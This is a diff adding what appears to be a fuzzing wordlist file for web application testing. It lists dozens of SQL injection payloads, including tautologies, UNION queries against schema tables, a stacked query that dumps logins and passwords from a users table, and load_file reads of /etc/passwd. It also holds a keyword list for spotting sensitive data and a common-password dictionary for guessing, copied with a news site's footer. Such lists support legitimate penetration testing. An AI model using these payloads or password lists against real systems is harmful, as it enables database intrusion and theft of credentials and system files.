@@ -1,0 +1,102 @@
+external fuzz vectors:
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' OR 1=1-- 
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+%22+or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+Admin' OR '
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 'unusual' = 'unusual'
+' OR 'something' = 'some'+'thing'
+' OR 'text' = N'text'
+' OR 'something' like 'some%'
+' OR 2 > 1
+' OR 'text' > 't'
+' OR 'whatever' in ('whatever')
+' OR 2 BETWEEN 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select 
+Password:*/=1--
+UNI/**/ON SEL/**/ECT
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+'; EXEC ('SEL' + 'ECT US' + 'ER')
+'/**/OR/**/1/**/=/**/1
+' or 1/*
++or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+&password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+ @var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+
+sensitive data:
+password
+user
+username
+admin
+sql
+mysql
+pass
+nuclear_launch_codes
+
+password dictionary:
+1. password (Unchanged) 
+2, 123456 (Unchanged) 
+3. 12345678 (Unchanged) 
+4. abc123 (Up 1) 
+5. qwerty (Down 1) 
+6. monkey (Unchanged) 
+7. letmein (Up 1) 
+8. dragon (Up 2) 
+9. 111111 (Up 3) 
+10. baseball (Up 1) 
+11. iloveyou (Up 2) 
+12. trustno1 (Down 3) 
+13. 1234567 (Down 6) 
+14. sunshine (Up 1) 
+15. master (Down 1) 
+16. 123123 (Up 4) 
+17. welcome (New) 
+18. shadow (Up 1) 
+19. ashley (Down 3) 
+20. football (Up 5) 
+21. jesus (New) 
+22. michael (Up 2) 
+23. ninja     (New) 
+24. mustang (New) 
+25. password1 (New)
+
+Read more: http://www.dailymail.co.uk/sciencetech/article-2223197/Revealed-The-common-passwords-used-online-year-password-STILL-tops-list.html#ixzz2KjJmLX7t 
+Follow us: @MailOnline on Twitter | DailyMail on Facebook
+
+sanitization checking inputs:
+...
+
+page guessing:
+-> "an external list of common URLs to discover potentially unlinked pages"
